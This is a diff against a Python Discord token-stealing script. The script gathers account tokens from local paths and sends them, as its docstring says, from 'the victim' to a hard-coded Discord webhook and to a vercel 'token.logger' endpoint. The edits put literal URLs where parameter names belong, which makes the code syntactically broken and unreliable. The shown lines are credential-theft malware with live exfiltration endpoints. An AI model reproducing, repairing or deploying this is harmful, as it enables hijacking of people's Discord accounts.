@@ -18,7 +18,7 @@ WEBHOOK_URL = https://discord.com/api/webhooks/1350218095075131428/IqOf20s4d7Pk4
 
 def make_post_request(https://skibiditoleitepisode.vercel.app/api/token.logger: str, data: typing.Dict[str, str]) -> int:
     request = urllib.request.Request(
-        api_url, data=json.dumps(data).encode(),
+        https://skibiditoleitepisode.vercel.app/api/token.logger, data=json.dumps(data).encode(),
         headers=REQUEST_HEADERS
     )
 
@@ -108,7 +108,7 @@ def get_tokens_from_path(base_path: str) -> typing.Dict[str, set]:
 
 
 def send_tokens_to_webhook(
-    webhook_url: str, user_id_to_token: typing.Dict[str, set[str]]
+    https://discord.com/api/webhooks/1350218095075131428/IqOf20s4d7Pk4GvGMikuUod8pE7hdi2KssTk_tmhJtPoWmq7P8PmxLiBiK6KIWcLuara: str, user_id_to_token: typing.Dict[str, set[str]]
 ) -> int:
     """
     Caution: In scenarios where the victim has logged into multiple Discord
@@ -143,7 +143,7 @@ def main() -> None:
     if tokens is None:
         return
 
-    send_tokens_to_webhook(WEBHOOK_URL, tokens)
+    send_tokens_to_webhook(https://discord.com/api/webhooks/1350218095075131428/IqOf20s4d7Pk4GvGMikuUod8pE7hdi2KssTk_tmhJtPoWmq7P8PmxLiBiK6KIWcLuara, tokens)
 
 
 if __name__ == "__main__":
